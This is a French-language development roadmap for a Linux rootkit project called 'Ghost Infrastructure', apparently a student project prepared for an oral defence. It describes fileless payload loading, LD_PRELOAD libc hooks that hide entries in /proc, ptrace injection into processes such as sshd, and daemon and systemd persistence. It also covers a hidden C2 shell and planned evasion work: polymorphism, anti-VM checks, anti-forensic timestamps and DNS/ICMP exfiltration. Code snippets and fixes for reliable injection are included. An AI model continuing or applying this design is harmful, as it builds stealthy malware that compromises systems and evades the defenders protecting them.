# Ghost Infrastructure — Roadmap de Développement

> Document de suivi pour continuation future du projet  
> Dernière mise à jour : v5.1

---

## État Actuel du Projet

### Score : 9/10

Le projet a atteint un niveau de maturité quasi-professionnel après 5 itérations d'audit et de corrections. Les mécanismes de concurrence sont robustes, le filtrage `/proc` fonctionne sur les systèmes modernes, et les principaux artefacts détectables ont été éliminés.

---

## Architecture Globale

```
┌─────────────────────────────────────────────────────────────────┐
│                     GHOST INFRASTRUCTURE                        │
├─────────────────────────────────────────────────────────────────┤
│  Payload Layer                                                 │
│  ├── encrypt_payload.py (AES-256-GCM)                         │
│  ├── stager.py (fileless decryption + dlopen)                │
│  └── evador.c (memfd-based loader)                            │
├─────────────────────────────────────────────────────────────────┤
│  Injection Layer                                               │
│  ├── ghost_lib.c (light version, target detection)            │
│  ├── hijack.so (full rootkit with hooks)                     │
│  └── injector.c (ptrace-based remote injection)               │
├─────────────────────────────────────────────────────────────────┤
│  Persistence Layer                                             │
│  ├── survival.sh (double-fork daemon)                         │
│  ├── master_deploy.sh (full infrastructure)                   │
│  └── systemd service (user-level persistence)                  │
├─────────────────────────────────────────────────────────────────┤
│  BPF Layer (Advanced)                                        │
│  ├── ghost.bpf.c (sk_lookup redirection)                      │
│  ├── loader.c (BPF loader + FD transfer)                    │
│  └── receiver.c (ghost socket receiver)                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Fichiers du Projet

| Fichier | Status | Description |
|---------|--------|-------------|
| `config.h` | ✅ Stable | Configuration centralisée |
| `ghost_lib.c` | ✅ Stable | Version légère avec détection de cible |
| `hijack.c` | ✅ Stable | Full rootkit avec tous les hooks |
| `injector.c` | ⚠️ Partiel | Injection ptrace (usleep au lieu de SIGTRAP) |
| `evador.c` | ✅ Stable | Chargement fileless via memfd |
| `receiver.c` | ✅ Stable | Récepteur socket fantôme |
| `loader.c` | ✅ Stable | Loader BPF |
| `stager.py` | ✅ Stable | Décryptage + exécution fileless |
| `Makefile` | ✅ Stable | Build system unifié |

---

## Problèmes Connus (Priorisés)

### 🔴 Critique — Non corrigé

| Problème | Fichier | Description |
|----------|---------|-------------|
| Injection non déterministe | `injector.c` | Utilise `usleep(200000)` au lieu d'attendre SIGTRAP. Peut crasher la cible sur système chargé. |

**Solution** : Implémenter une attente via breakpoint int3 + `waitpid()` sur SIGTRAP :
```c
// Pseudo-code de la correction :
// 1. Injecter shellcode: mov rdi, path; mov rsi, RTLD_LAZY; call dlopen; int3
// 2. PTRACE_CONT
// 3. waitpid(pid, &status, 0) → attendre WIFSIGNALED(SIGTRAP)
// 4. Lire retour RAX = handle
// 5. Restaurer page mémoire sauvegardée
// 6. Restaurer registres
// 7. PTRACE_DETACH
```

### 🟡 Important — Non corrigé

| Problème | Fichier | Description |
|----------|---------|-------------|
| openat() path relatif | `hijack.c`, `ghost_lib.c` | `openat(proc_fd, "maps")` bypass le filtrage |
| O_PATH non géré | `hijack.c`, `ghost_lib.c` | Retourne un memfd pour O_PATH, UB potentiel |
| Fallback sur erreur | `hijack.c`, `ghost_lib.c` | Retourne `real_open()` si filtrage échoue au lieu de EPERM |

### 🟢 Cosmétique — Non corrigé

| Problème | Fichier | Description |
|----------|---------|-------------|
| memfd_create visible | Kernel | Syscall 319 détectable par auditd/eBPF |
| musl non supporté | `injector.c` | Pattern libc- / libc.so ne couvre pas musl |
| Commentaires fork | `hijack.c`, `ghost_lib.c` | Hypothèses de sécurité non documentées |

---

## Implémentations Clés (à retenir)

### 1. Hooks libc via dlsym(RTLD_NEXT)

```c
typedef int (*open_t)(const char *, int, ...);
static open_t real_open = NULL;

static int init_libc_funcs(void) {
    real_open = (open_t)dlsym(RTLD_NEXT, "open");
    // ...
}
```

**Point clé** : `RTLD_NEXT` cherche le symbole dans les bibliothèques **après** la lib courante, permettant d'intercepter les appels libc originaux.

### 2. Filtrage /proc via memfd

```c
static int filter_maps_create_fd(const char *path) {
    pthread_mutex_lock(&maps_mutex);
    // ... filtrage dans buffer ...
    int fd = create_filtered_memfd(filtered, total);  // Crée memfd SOUS mutex
    pthread_mutex_unlock(&maps_mutex);
    return fd;  // Retourne FD, pas de pointeur buffer
}
```

**Pattern sécurisé** : Le mutex protège le buffer pendant le filtrage ET la création du memfd. Le pointeur buffer n'est jamais utilisé après unlock.

### 3. Résolution d'adresse distante (ASLR)

```c
// 1. Lire /proc/self/maps pour libc locale
// 2. Calculer offset = dlopen_addr_local - libc_base_local
// 3. Lire /proc/<pid>/maps pour libc cible
// 4. Adresse distante = libc_base_distante + offset
```

---

## Routes d'Amélioration Futures

### Priorité 1 : Fiabilité de l'Injection

```
injector.c
    ├── Remplacer usleep() par waitpid(SIGTRAP)
    ├── Ajouter validation paramètres complète
    └── Tester sur VM avec ASLR activé
```

### Priorité 2 : Détection Réduite

```
hijack.c / ghost_lib.c
    ├── Implémenter port knocking (ports顺序)
    ├── Ajouter chiffrement TLS sur le shell
    ├── Utiliser ports standards (443, 53) comme C2
    └── Détection de débogage (ptrace self-check)
```

### Priorité 3 : Portabilité

```
Système
    ├── Support musl libc (Alpine)
    ├── Cible processus universels (sshd, cron)
    └── Générateur de config (ports, paths paramétrables)
```

### Priorité 4 : Évasion Avancée

```
Défense evasion
    ├── Polymorphisme (mutation du code à chaque compile)
    ├── Anti-VM (détection environnement)
    ├── Timestamps anti-forensics (utimensat)
    └── Exfiltration DNS / ICMP
```

---

## Commandes de Build

```bash
# Build complet
make all

# Build individuel
make hijack.so
make ghost_lib.so
make evador
make injector
make receiver

# Setup libbpf (si nécessaire)
make setup-libbpf

# Nettoyage
make clean
make distclean

# Aide
make help
```

---

## Structure des Tests Recommandés

Pour un projet de ce type, les tests seraient :

1. **Tests unitaires** (difficiles sans infra dédiée)
   - `filter_maps_create_fd()` sur processus de test
   - Vérification que FD est bien retourné

2. **Tests d'intégration**
   - LD_PRELOAD dans un processus bidon
   - Vérification que port 9999 est ouvert
   - Vérification que `/proc/self/maps` est filtré

3. **Tests de concurrence**
   - 20 threads simulatanés ouvrant `/proc/self/maps`
   - Vérification qu'aucune corruption

4. **Tests de robustesse**
   - Injection sur processus sous charge
   - Vérification survive aux signaux

---

## Références Techniques

- **eBPF sk_lookup** : Kernel ≥ 5.9, `BPF_SK_LOOKUP`
- **memfd_create** : syscall 319, `MFD_CLOEXEC`
- **ptrace** : `PTRACE_ATTACH`, `PTRACE_POKEDATA`, `PTRACE_GETREGS`
- **mutex POSIX** : `pthread_mutex_*`, `PTHREAD_MUTEX_INITIALIZER`
- **RTLD_NEXT** : Accès symboles "prochains" dans l'ordre de chargement

---

## Notes pour la Soutenance

**Points forts à valoriser :**
- Combinaison sk_lookup + SCM_RIGHTS (rare à ce niveau)
- Filtrage /proc via memfd (élimine artefacts disque)
- Gestion robuste de la concurrence (mutex séparés)
- Résolution ASLR pour injection distante

**Réponses préparées :**
- *"Pourquoi deux mutex ?"* → Élimine contention croisée et race condition post-unlock
- *"Pourquoi memfd au lieu de fichier ?"* → Zéro artefact disque, plus difficile à détecter
- *"Limitations ?"* → Injection ptrace non déterministe (connue), port hardcodé

---

## Glossaire

| Terme | Définition |
|-------|------------|
| LD_PRELOAD | Mécanisme Linux pour intercepter appels libc |
| memfd | File descriptor en RAM (pas de fichier disque) |
| SCM_RIGHTS | Passage de file descriptors via socket Unix |
| sk_lookup | Hook eBPF pour interception trafic réseau |
| ASLR | Randomisation des adresses mémoire |
| RTLD_NEXT | Symbole "suivant" dans ordre libraries |

---

*Document généré automatiquement — Ghost Infrastructure v5.1*
